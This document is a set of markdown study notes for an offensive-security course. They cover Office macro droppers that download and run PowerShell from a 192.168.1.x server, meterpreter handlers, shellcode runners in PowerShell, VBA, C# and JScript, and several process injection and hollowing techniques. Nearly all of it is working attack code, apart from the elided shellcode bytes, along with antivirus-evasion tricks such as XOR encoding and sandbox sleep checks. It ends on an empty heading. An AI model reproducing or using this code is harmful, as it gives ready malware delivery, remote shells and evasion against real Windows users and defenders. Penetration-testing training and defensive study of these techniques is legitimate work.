# OSEP 
## msfconsole oneline command
```
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.1.104 ;LPORT 8080;exploit -j"
```
## Genrate meterpreter VBA shell code with msfvenom
```
msfvenom -p windows/meterpreter/reverse_https LHOST= LPORT= EXITFUNC=thread -f vbapplication
```
## C# Stage LAB
https://github.com/mvelazc0/defcon27_csharp_workshop

## C# Bypass Application List
https://zhuanlan.zhihu.com/p/113015326
https://github.com/khr0x40sh/WhiteListEvasion
## VBA run remote powershell
### run 32 bit mode use 32 shellcode

```
Sub MyMacro()
strArg = "C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.104:8787/run.txt'))"
GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
Sub AutoOpen()
MyMacro
End Sub
```

### run 64 bit mode use 64 shellcode

```
Sub MyMacro()
strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.1.104:8787/run.txt'))"
GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
Sub AutoOpen()
MyMacro
End Sub
```

## powershell shellcode

```
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
	Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType {
	Param (
	[Parameter(Position = 0, Mandatory = $True)] [Type[]] 
	$func,[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
	$type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = ..... 

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
## VBA declare fucntion
### call winapi data type 
https://www.codingdomain.com/visualbasic/win32api/datatypes/
https://zhuanlan.zhihu.com/p/264483065
https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types
https://payloads.online/archivers/2019-05-16/1
### Getusername
https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea
```
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Function MyMacro()
Dim res As Long
Dim MyBuff As String * 256
Dim MySize As Long
Dim strlen As Long
MySize = 256
res = GetUserName(MyBuff, MySize)
strlen = InStr(1, MyBuff, vbNullChar) - 1
MsgBox Left$(MyBuff, strlen)
End Function


Sub GetUserNames()

MyMacro

End Sub

```
### MessageBoxA
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa
3.4.1.1 Exercises  Import the Win32 MessageBoxA API and call it using VBA.
```
Private Declare Function MessageBoxA Lib "User32.dll" (ByVal hWnd As Integer, ByVal txt As String, ByVal caption As String, ByVal uType As Integer) As Integer
Function MyMacro()
Dim res As Integer
res = MessageBoxA(0, "message content", "title", 0)
End Function

Sub XXXXXX()

MyMacro

End Sub

```
### VirtualAlloc

```
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
```
### CreateThread 
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes
As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As
LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
```

### RtlMoveMemory
```
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As
LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
```

### VBA reverse shell
```
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As  Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Function MyMacro()
Dim buf As Variant
Dim addr As LongPtr
Dim counter As Long
Dim data As Long
Dim res As Long
buf = Array(.....)

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
For counter = LBound(buf) To UBound(buf)
data = buf(counter)
res = RtlMoveMemory(addr + counter, data, 1)
Next counter
res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
Sub Document_Open()
MyMacro
End Sub
Sub AutoOpen()
MyMacro
End Sub

```

## Windows API Powershell
### GetUserName
http://www.pinvoke.net/default.aspx/advapi32/GetUserName.html
Apply the same techniques to call the Win32 GetUserName API.
```
$sig = @'
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
'@

Add-Type -MemberDefinition $sig -Namespace Advapi32 -Name Util

$size = 64
$str = New-Object System.Text.StringBuilder -ArgumentList $size

[Advapi32.util]::GetUserName($str,[ref]$size) |Out-Null
$str.ToString()
```

### Download Powershell to victim
Is it possible to use a different file extension like .txt for the run.ps1 file?
```
Sub MyMacro()
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.1.108:8787/1.jpg') | IEX"
Shell str, vbHide
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub AutoOpen()
MyMacro
End Sub
```

### VBA run shellcode with powershell
```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32", CharSet=CharSet.Ansi)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

[Byte[]] $buf = .....

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

## Keep That PowerShell in Memory
### Microsoft.Win32.UnsafeNativeMethods
https://www.anquanke.com/post/id/176015
### Lookup Win32API Function without add-type
```
function LookupFunc {
	 Param ($moduleName, $functionName)
	 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	 $tmp=@()
	 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}
```
### ***Use Delegate Reflection and create Constructor to call windows API (Winexec)

```
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].	Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp=@()
	$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

$WinExec = LookupFunc Kernel32.dll WinExec

$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly,
[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

// Windows Api Winexec Argument
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard,@([String], [int]))

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')


$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual',[int],@([String], [int]))

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()

$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WinExec, $MyDelegateType)

$MyFunction.Invoke("notepad.exe",1)
```

### GetDelegateType Function
```
function getDelegateType {

		Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
		
		$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
		(New-Object System.Reflection.AssemblyName('ReflectedDelegate')),		[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
		[System.MulticastDelegate])
		
		$type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).	SetImplementationFlags('Runtime, Managed')
		
		$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
		
		return $type.CreateType()
}
```
### PowerShell Proxy Communication
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.1.108/1.jpg")
```
## Dropper in Jscript shellcode
### Javscript proxy
```
var url = "http://192.168.1.108:8787/test.exe";
var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP.6.0');
Object.setProxy(0,"http://192.168.1.107:3128");
Object.open("GET", url, false);
Object.send();
WScript.Echo(Object.status);

if (Object.status == 200)
{
	var Stream = WScript.CreateObject('ADODB.Stream');
	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.responseBody);
	Stream.Position = 0;
	Stream.SaveToFile("test.exe", 2);
	Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("test.exe");
```
### jscript
command:`DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`
must distinguish payload x86/x64
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);



        static void Main(string[] args)
        {   // windows/x64/meterpreter/reverse_https
            byte[] buf = new byte[777] {....};

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
### C# Cover to jscript
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public TestClass()
    {
        byte[] buf = new byte[777] {.....};
        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```
## Process Injection and Migration
### Process Injection with PID in C#
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Injection_PID
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        //HANDLE OpenProcess(
        //DWORD dwDesiredAccess,
        //BOOL bInheritHandle,
        //DWORD dwProcessId
        //);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);
        //LPVOID VirtualAllocEx(
        //HANDLE hProcess,
        //LPVOID lpAddress,
        //SIZE_T dwSize,
        //DWORD flAllocationType,
        //DWORD flProtect
        //);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        //BOOL WriteProcessMemory(
        //    HANDLE hProcess,
        //    LPVOID lpBaseAddress,
        //    LPCVOID lpBuffer,
        //    SIZE_T nSize,
        //    SIZE_T* lpNumberOfBytesWritten
        //    );
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);
        //HANDLE CreateRemoteThread(
        //HANDLE hProcess,
        //LPSECURITY_ATTRIBUTES lpThreadAttributes,
        //SIZE_T dwStackSize,
        //LPTHREAD_START_ROUTINE lpStartAddress,
        //LPVOID lpParameter,
        //DWORD dwCreationFlags,
        //LPDWORD lpThreadId
        //);

        static void Main(string[] args)
        {
            Int32 explorerid = 0;
            try
            {
                Process[] explorer = Process.GetProcessesByName("explorer");
                
                if (explorer.Length < 2)
                {
                    foreach (Process p in explorer)
                    {
                        explorerid= p.Id;
                        //Get explorer pid
                    }
                }
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                // msfvenom - p windows/x64/meterpreter/reverse_https LHOST = 192.168.1.108 LPORT=8080 EXITFUNC=thread -f csharp
                byte[] buf = new byte[720] {.... };

                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```
### 5.1.2.2 Extra Mile 
#### LARGE_INTEGER
https://www.coder.work/article/2946808
```
[StructLayout(LayoutKind.Explicit, Size=8)]
struct LARGE_INTEGER
{
    [FieldOffset(0)]public Int64 QuadPart;
    [FieldOffset(0)]public UInt32 LowPart;
    [FieldOffset(4)]public Int32 HighPart;
}
```
#### Process Injection with PID in C# replace WriteProcessMemory & VirtualAllocEx
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Injection_PID
{
    class Program
    {
        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public Int32 HighPart;
        }
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle
         );
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect
        );
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        static void Main(string[] args)
        {
            byte[] buf = new byte[720] {.... };

            try
            {
                LARGE_INTEGER sectionSize = new LARGE_INTEGER { };
                uint size_ = (uint)buf.Length;
                sectionSize.LowPart = size_;
                IntPtr sectionHandle = IntPtr.Zero;
                IntPtr localSectionAddress = IntPtr.Zero;
                IntPtr remoteSectionAddress = new IntPtr();
                IntPtr targetThreadHandle = IntPtr.Zero;

                uint allocType = 0;
                ulong outSize = 0;
                uint size = 4096;
                ulong sectionOffset = 0;

                NtCreateSection(ref sectionHandle, 0x0004 | 0x0002 | 0x0008, IntPtr.Zero, ref sectionSize.LowPart, 0x40, 0x08000000, IntPtr.Zero);
                NtMapViewOfSection(sectionHandle,GetCurrentProcess(), ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out outSize, out size, 2, allocType, 0x04);

                Process[] explorer = Process.GetProcessesByName("notepad");
                int explorerid = explorer[0].Id;
                IntPtr targetHandle = OpenProcess(0x001F0FFF, false, explorerid);

                NtMapViewOfSection(sectionHandle,targetHandle,ref remoteSectionAddress,UIntPtr.Zero,UIntPtr.Zero,out sectionOffset,out size,2, allocType, 0x20);
                // msfvenom - p windows/x64/meterpreter/reverse_https LHOST = 192.168.1.108 LPORT=8080 EXITFUNC=thread -f csharp

                Marshal.Copy(buf, 0, localSectionAddress, length :buf.Length);
                NtUnmapViewOfSection(targetHandle, localSectionAddress);
                
                RtlCreateUserThread(targetHandle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, remoteSectionAddress, IntPtr.Zero, ref targetThreadHandle, IntPtr.Zero);
                NtClose(targetHandle);
               
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}

```
#### Reflective DLL Injection
 Process Access right must be eqal injection target right 
```
powershell -ep bypass -c "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.108:8787/met.dll');$procid = (Get-Process -Name notepad).Id;Import-Module C:\Users\oscp\Downloads\Invoke-ReflectivePEInjection.ps1;Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
```

### Process Hollowing
```
using System;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[598] {.... };

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}

```
## Bypassing Antivirus with C#
### XOR
```
using System;
using System.IO;
using System.Text;

namespace XOR_Shellcode
{
    class Program
    {

        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                try
                {

                    String FileName = System.IO.Path.GetFileName(args[0]);
                    var bytes = File.ReadAllBytes(args[0]); //Read File 
                    //XOR_ENCODE
                    byte[] encoded = new byte[bytes.Length];
                    for (int i = 0; i < bytes.Length; i++)
                    {
                        encoded[i] = (byte)(((uint)bytes[i] ^ 0xAA ) & 0xFF);
                    }
                    // Write XOR Binary File
                    BinaryWriter Writer = null;
                    string Xorname = "XOR_" + FileName;
                    Writer = new BinaryWriter(File.OpenWrite(Xorname));
                    Writer.Write(encoded);
                    Writer.Flush();
                    Writer.Close();

                    StringBuilder hex = new StringBuilder(encoded.Length * 2);
                    foreach (byte b in encoded)
                    {
                        hex.AppendFormat("0x{0:x2}, ", b);
                    }
                    Console.WriteLine("The payload is: " + hex.ToString());

                }
                catch (Exception e)
                {
                    Console.WriteLine(e);

                }
            }
            else
            {
                Console.WriteLine("useage:" + AppDomain.CurrentDomain.FriendlyName + " shellcodefile");
            }

        }
    }
}

```
### XOR + Time Delay + VirtualAllocExNuma

```
using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[460] { ..... };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
## VBA XOR Shellcode Genrate
```
using System;
using System.IO;
using System.Text;

namespace VBA_XOR_Shellcode
{
    class Program
    {

        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                try
                {
                    uint Key = 0xAA;
                    String FileName = System.IO.Path.GetFileName(args[0]);
                    var bytes = File.ReadAllBytes(args[0]); //Read File 
                    //XOR_ENCODE
                    byte[] encoded = new byte[bytes.Length];
                    for (int i = 0; i < bytes.Length; i++)
                    {
                        encoded[i] = (byte)(((uint)bytes[i] ^ Key) & 0xFF);
                    }

                    uint counter = 0;
                    StringBuilder hex = new StringBuilder(encoded.Length * 2);
                    foreach (byte b in encoded)
                    {
                        hex.AppendFormat("{0:D}, ", (Int32)b);
                        counter++;
                        if (counter % 50 == 0)
                           {
                            hex.AppendFormat("_{0}", Environment.NewLine);
                        }
                    }
                    Console.WriteLine("The payload is: " + hex.ToString());
                    Console.WriteLine("XOR Key dec is : {0}" , Key);

                }
                catch (Exception e)
                {
                    Console.WriteLine(e);

                }
            }
            else
            {
                Console.WriteLine("useage:" + AppDomain.CurrentDomain.FriendlyName + " shellcodefile");
            }

        }
    }
}

```
## Bypassing Antivirus in VBA
```
